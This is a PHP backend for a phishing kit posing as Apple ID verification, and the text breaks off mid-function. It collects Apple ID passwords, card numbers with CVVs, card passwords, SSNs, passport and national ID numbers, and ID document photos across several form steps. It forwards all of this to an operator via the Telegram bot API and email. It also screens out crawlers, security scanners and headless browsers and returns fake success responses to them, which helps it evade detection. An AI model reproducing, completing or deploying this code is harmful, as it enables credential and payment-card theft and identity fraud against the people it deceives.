<?php
// Set headers to handle AJAX requests
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, X-Verification-Token');

// Create upload directory if it doesn't exist
$uploadDir = 'uploads/';
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Anti-Bot Protection
function checkForBot($request) {
    // Check if the request has the necessary headers
    if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || $_SERVER['HTTP_X_REQUESTED_WITH'] !== 'XMLHttpRequest') {
        return true;
    }
    
    // Check verification token
    if (!isset($_SERVER['HTTP_X_VERIFICATION_TOKEN']) || empty($_SERVER['HTTP_X_VERIFICATION_TOKEN'])) {
        return true;
    }
    
    // Check if verification data is provided
    if (!isset($request['verification']) || empty($request['verification'])) {
        return true;
    }
    
    // Decode verification data
    $verification = json_decode($request['verification'], true);
    
    // Check time spent on page (bots usually submit too quickly)
    if (isset($verification['timeOnPage']) && $verification['timeOnPage'] < 3000) {
        return true;
    }
    
    // Check mouse movements (bots often don't move the mouse)
    if (isset($verification['mouseMoves']) && $verification['mouseMoves'] < 5) {
        return true;
    }
    
    // Check key presses (if applicable fields existed)
    if (isset($verification['keyPresses']) && $verification['keyPresses'] < 10) {
        return true;
    }
    
    // Check for common bot user agents
    $botSignatures = array(
        'bot', 'spider', 'crawl', 'lighthouse', 'slurp', 'phantom', 'headless',
        'selenium', 'puppeteer', 'chrome-lighthouse', 'googlebot', 'yandexbot',
        'bingbot', 'robot', 'curl', 'wget', 'scraper', 'java/', 'python-requests'
    );
    
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botSignatures as $signature) {
        if (strpos($userAgent, $signature) !== false) {
            return true;
        }
    }
    
    return false;
}

// Function to generate new verification token
function generateNewToken($length = 32) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// Function to send data to Telegram
function sendToTelegram($message) {
    // Replace with your actual bot token and chat ID
    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
    $chatId = 'YOUR_CHAT_ID';
    
    // Format message for Telegram
    $formattedMessage = urlencode($message);
    
    // Telegram API URL
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$formattedMessage}&parse_mode=HTML";
    
    // Send request to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Function to send photo to Telegram
function sendPhotoToTelegram($photoPath, $caption = '') {
    // Replace with your actual bot token and chat ID
    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
    $chatId = 'YOUR_CHAT_ID';
    
    // Format caption for Telegram
    $formattedCaption = urlencode($caption);
    
    // Initialize cURL
    $ch = curl_init();
    
    // Create a CURLFile object
    $cFile = new CURLFile($photoPath);
    
    // Set up the data for the request
    $postFields = array(
        'chat_id' => $chatId,
        'photo' => $cFile,
        'caption' => $caption,
        'parse_mode' => 'HTML'
    );
    
    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$botToken/sendPhoto");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    // Execute the request
    $response = curl_exec($ch);
    
    // Close the cURL session
    curl_close($ch);
    
    return $response;
}

// Function to send data to email
function sendToEmail($data) {
    $to = "your-email@example.com"; // Replace with your email
    $subject = "New Apple Verification Data";
    
    // Prepare the email content
    $message = "New verification data submitted:\n\n";
    foreach ($data as $key => $value) {
        if ($key !== 'verification') {
            $message .= "$key: $value\n";
        }
    }
    
    // Add IP and timestamp
    $message .= "\nIP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    
    // Additional headers
    $headers = "From: apple-verification@your-domain.com\r\n";
    $headers .= "Reply-To: no-reply@your-domain.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    // Send the email
    mail($to, $subject, $message, $headers);
}

// Process the request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verify the request is from a valid source, not a bot
    if (checkForBot($_POST)) {
        // Return normal response to not alert bots, but don't process the data
        $response = array(
            'status' => 'success',
            'token' => $_SERVER['HTTP_X_VERIFICATION_TOKEN'] ?? '',
            'newToken' => generateNewToken()
        );
        echo json_encode($response);
        exit;
    }
    
    // Get step number
    $step = isset($_POST['step']) ? intval($_POST['step']) : 0;
    
    // Collection of data from the form
    $data = array();
    
    // Process based on step
    switch ($step) {
        case 1:
            // Account credentials step
            if (isset($_POST['email']) && isset($_POST['password'])) {
                $data = array(
                    'step' => 'Account Information',
                    'email' => $_POST['email'],
                    'password' => $_POST['password'],
                    'ip' => $_SERVER['REMOTE_ADDR'],
                    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                    'timestamp' => date('Y-m-d H:i:s')
                );
                
                // Format message for Telegram
                $message = "🔐 <b>Apple ID Data:</b>\n";
                $message .= "📧 <b>Email:</b> " . $_POST['email'] . "\n";
                $message .= "🔑 <b>Password:</b> " . $_POST['password'] . "\n";
                $message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";
                $message .= "📱 <b>User Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
                $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
                
                // Send data to Telegram and email
                sendToTelegram($message);
                sendToEmail($data);
            }
            break;
            
        case 2:
            // Personal information step with ID uploads
            if (isset($_POST['fullname']) && isset($_POST['dob']) && isset($_POST['phone']) && isset($_POST['address'])) {
                $data = array(
                    'step' => 'Personal Information',
                    'email' => $_POST['email'] ?? '',
                    'fullname' => $_POST['fullname'],
                    'dob' => $_POST['dob'],
                    'phone' => $_POST['phone'],
                    'address' => $_POST['address'],
                    'ip' => $_SERVER['REMOTE_ADDR'],
                    'timestamp' => date('Y-m-d H:i:s')
                );
                
                // Handle ID front upload
                $idFrontPath = '';
                if (isset($_FILES['id_front']) && $_FILES['id_front']['error'] === UPLOAD_ERR_OK) {
                    $fileType = pathinfo($_FILES['id_front']['name'], PATHINFO_EXTENSION);
                    $newFileName = 'id_front_' . time() . '_' . rand(1000, 9999) . '.' . $fileType;
                    $uploadFile = $uploadDir . $newFileName;
                    
                    if (move_uploaded_file($_FILES['id_front']['tmp_name'], $uploadFile)) {
                        $idFrontPath = $uploadFile;
                        $data['id_front_path'] = $idFrontPath;
                    }
                }
                
                // Handle ID back upload (if provided)
                $idBackPath = '';
                if (isset($_FILES['id_back']) && $_FILES['id_back']['error'] === UPLOAD_ERR_OK) {
                    $fileType = pathinfo($_FILES['id_back']['name'], PATHINFO_EXTENSION);
                    $newFileName = 'id_back_' . time() . '_' . rand(1000, 9999) . '.' . $fileType;
                    $uploadFile = $uploadDir . $newFileName;
                    
                    if (move_uploaded_file($_FILES['id_back']['tmp_name'], $uploadFile)) {
                        $idBackPath = $uploadFile;
                        $data['id_back_path'] = $idBackPath;
                    }
                }
                
                // Format message for Telegram
                $message = "👤 <b>Personal Information:</b>\n";
                $message .= "📧 <b>Email:</b> " . ($_POST['email'] ?? 'N/A') . "\n";
                $message .= "👨‍💼 <b>Name:</b> " . $_POST['fullname'] . "\n";
                $message .= "🎂 <b>DOB:</b> " . $_POST['dob'] . "\n";
                $message .= "📞 <b>Phone:</b> " . $_POST['phone'] . "\n";
                $message .= "🏠 <b>Address:</b> " . $_POST['address'] . "\n";
                $message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";
                $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
                
                if ($idFrontPath) {
                    $message .= "🆔 <b>ID Front:</b> Uploaded ✅\n";
                }
                
                if ($idBackPath) {
                    $message .= "🆔 <b>ID Back:</b> Uploaded ✅\n";
                }
                
                // Send message to Telegram
                sendToTelegram($message);
                
                // For Telegram image sending (if needed)
                if ($idFrontPath) {
                    // You can add code here to send ID images directly to Telegram
                    // using the Telegram sendPhoto API endpoint
                }
                
                // Send data to email
                sendToEmail($data);
            }
            break;
            
        case 3:
            // Card information step
            if (isset($_POST['cardType']) && isset($_POST['cardNumber']) && isset($_POST['expiry']) && isset($_POST['cvv'])) {
                $data = array(
                    'step' => 'Card Information',
                    'email' => $_POST['email'] ?? '',
                    'card_type' => $_POST['cardType'],
                    'card_number' => $_POST['cardNumber'],
                    'expiry' => $_POST['expiry'],
                    'cvv' => $_POST['cvv'],
                    'ip' => $_SERVER['REMOTE_ADDR'],
                    'timestamp' => date('Y-m-d H:i:s')
                );
                
                // Format message for Telegram
                $message = "💳 <b>Payment Information:</b>\n";
                $message .= "📧 <b>Email:</b> " . ($_POST['email'] ?? 'N/A') . "\n";
                $message .= "💳 <b>Card Type:</b> " . $_POST['cardType'] . "\n";
                $message .= "🔢 <b>Card Number:</b> " . $_POST['cardNumber'] . "\n";
                $message .= "📅 <b>Expiry:</b> " . $_POST['expiry'] . "\n";
                $message .= "🔒 <b>CVV:</b> " . $_POST['cvv'] . "\n";
                $message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";
                $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
                
                // Send data to Telegram and email
                sendToTelegram($message);
                sendToEmail($data);
            }
            break;
            
        case 4:
            // Final submission with all data
            // Collect all data from the form
            $data = array(
                'step' => 'COMPLETE SUBMISSION',
                'ip' => $_SERVER['REMOTE_ADDR'],
                'user_agent' => $_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'],
                'timestamp' => date('Y-m-d H:i:s')
            );
            
            // Login Details
            $loginDetails = array(
                'email' => $_POST['email'] ?? '',
                'password' => $_POST['password'] ?? '',
                'webid' => $_POST['webid'] ?? ''
            );
            $data = array_merge($data, $loginDetails);
            
            // Card Details
            $cardDetails = array(
                'bank' => $_POST['bank'] ?? '',
                'card_level' => $_POST['cardLevel'] ?? '',
                'cardholder' => $_POST['cardholder'] ?? '',
                'card_number' => $_POST['cardNumber'] ?? '',
                'expiry' => $_POST['expiry'] ?? '',
                'cvv' => $_POST['cvv'] ?? '',
                'amex_cid' => $_POST['amexCid'] ?? '',
                'sort_code' => $_POST['sortCode'] ?? '',
                'credit_limit' => $_POST['creditLimit'] ?? '',
                'card_password' => $_POST['cardPassword'] ?? ''
            );
            $data = array_merge($data, $cardDetails);
            
            // Personal Information
            $personalInfo = array(
                'firstname' => $_POST['firstname'] ?? '',
                'lastname' => $_POST['lastname'] ?? '',
                'address' => $_POST['address'] ?? '',
                'city' => $_POST['city'] ?? '',
                'state' => $_POST['state'] ?? '',
                'country' => $_POST['country'] ?? '',
                'zip' => $_POST['zip'] ?? '',
                'dob' => $_POST['dob'] ?? '',
                'phone' => $_POST['phone'] ?? ''
            );
            $data = array_merge($data, $personalInfo);
            
            // Social Information
            $socialInfo = array(
                'id_number' => $_POST['idNumber'] ?? '',
                'civil_id' => $_POST['civilId'] ?? '',
                'qatar_id' => $_POST['qatarId'] ?? '',
                'national_id' => $_POST['nationalId'] ?? '',
                'citizen_id' => $_POST['citizenId'] ?? '',
                'passport' => $_POST['passport'] ?? '',
                'bank_access' => $_POST['bankAccess'] ?? '',
                'sin' => $_POST['sin'] ?? '',
                'ssn' => $_POST['ssn'] ?? '',
                'account_number' => $_POST['accountNumber'] ?? '',
                'osid' => $_POST['osid'] ?? ''
            );
            $data = array_merge($data, $socialInfo);
            
            // Handle ID document uploads
            $idFrontPath = '';
            if (isset($_FILES['id_front']) && $_FILES['id_front']['error'] === UPLOAD_ERR_OK) {
                $fileType = pathinfo($_FILES['id_front']['name'], PATHINFO_EXTENSION);
                $newFileName = 'id_front_' . time() . '_' . rand(1000, 9999) . '.' . $fileType;
                $uploadFile = $uploadDir . $newFileName;
                
                if (move_uploaded_file($_FILES['id_front']['tmp_name'], $uploadFile)) {
                    $idFrontPath = $uploadFile;
                    $data['id_front_path'] = $idFrontPath;
                }
            }
            
            $idBackPath = '';
            if (isset($_FILES['id_back']) && $_FILES['id_back']['error'] === UPLOAD_ERR_OK) {
                $fileType = pathinfo($_FILES['id_back']['name'], PATHINFO_EXTENSION);
                $newFileName = 'id_back_' . time() . '_' . rand(1000, 9999) . '.' . $fileType;
                $uploadFile = $uploadDir . $newFileName;
                
                if (move_uploaded_file($_FILES['id_back']['tmp_name'], $uploadFile)) {
                    $idBackPath = $uploadFile;
                    $data['id_back_path'] = $idBackPath;
                }
            }
            
            // Format complete message for Telegram in the specified format
            $message = "#--------------------------------[ LOGIN DETAILS ]-------------------------------#\n";
            $message .= "Apple ID : " . ($loginDetails['email'] ?? 'N/A') . "\n";
            $message .= "Password : " . ($loginDetails['password'] ?? 'N/A') . "\n";
            $message .= "#--------------------------------[ CARD DETAILS ]-------------------------------#\n";
            $message .= "Bank : " . ($cardDetails['bank'] ?? 'N/A') . "\n";
            $message .= "Level : " . ($cardDetails['card_level'] ?? 'N/A') . "\n";
            $message .= "Cardholders : " . ($cardDetails['cardholder'] ?? 'N/A') . "\n";
            $message .= "CC Number : " . ($cardDetails['card_number'] ?? 'N/A') . "\n";
            $message .= "Expired : " . ($cardDetails['expiry'] ?? 'N/A') . "\n";
            $message .= "CVV : " . ($cardDetails['cvv'] ?? 'N/A') . "\n";
            $message .= "AMEX CID : " . ($cardDetails['amex_cid'] ?? 'N/A') . "\n";
            $message .= "Sort Code : " . ($cardDetails['sort_code'] ?? 'N/A') . "\n";
            $message .= "Credit Limit : " . ($cardDetails['credit_limit'] ?? 'N/A') . "\n";
            $message .= "#--------------------------[ = INFO ]-----------------------------#\n";
            $message .= "WEB ID : " . ($loginDetails['webid'] ?? 'N/A') . "\n";
            $message .= "Card Password : " . ($cardDetails['card_password'] ?? 'N/A') . "\n";
            $message .= "#-------------------------[ PERSONAL INFORMATION ]--------------------------------#\n";
            $message .= "First Name : " . ($personalInfo['firstname'] ?? 'N/A') . "\n";
            $message .= "Last Name : " . ($personalInfo['lastname'] ?? 'N/A') . "\n";
            $message .= "Address : " . ($personalInfo['address'] ?? 'N/A') . "\n";
            $message .= "City : " . ($personalInfo['city'] ?? 'N/A') . "\n";
            $message .= "State : " . ($personalInfo['state'] ?? 'N/A') . "\n";
            $message .= "Country : " . ($personalInfo['country'] ?? 'N/A') . "\n";
            $message .= "Zip : " . ($personalInfo['zip'] ?? 'N/A') . "\n";
            $message .= "BirthDay : " . ($personalInfo['dob'] ?? 'N/A') . "\n";
            $message .= "Phone : " . ($personalInfo['phone'] ?? 'N/A') . "\n";
            $message .= "#------------------------[ SOCIAL INFORMATION ]------------------------------#\n";
            $message .= "ID Number : " . ($socialInfo['id_number'] ?? 'N/A') . "\n";
            $message .= "Civil ID : " . ($socialInfo['civil_id'] ?? 'N/A') . "\n";
            $message .= "Qatar ID : " . ($socialInfo['qatar_id'] ?? 'N/A') . "\n";
            $message .= "National ID : " . ($socialInfo['national_id'] ?? 'N/A') . "\n";
            $message .= "Citizen ID : " . ($socialInfo['citizen_id'] ?? 'N/A') . "\n";
            $message .= "Passport Number : " . ($socialInfo['passport'] ?? 'N/A') . "\n";
            $message .= "Bank Access Number : " . ($socialInfo['bank_access'] ?? 'N/A') . "\n";
            $message .= "Social Insurance Number : " . ($socialInfo['sin'] ?? 'N/A') . "\n";
            $message .= "Social Security Number : " . ($socialInfo['ssn'] ?? 'N/A') . "\n";
            $message .= "Account Number : " . ($socialInfo['account_number'] ?? 'N/A') . "\n";
            $message .= "OSID Number : " . ($socialInfo['osid'] ?? 'N/A') . "\n";
            $message .= "#------------------------[ DEVICE INFORMATION ]------------------------------#\n";
            $message .= "IP Address : " . $_SERVER['REMOTE_ADDR'] . "\n";
            $message .= "User Agent : " . ($_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT']) . "\n";
            $message .= "Date/Time : " . date('Y-m-d H:i:s') . "\n";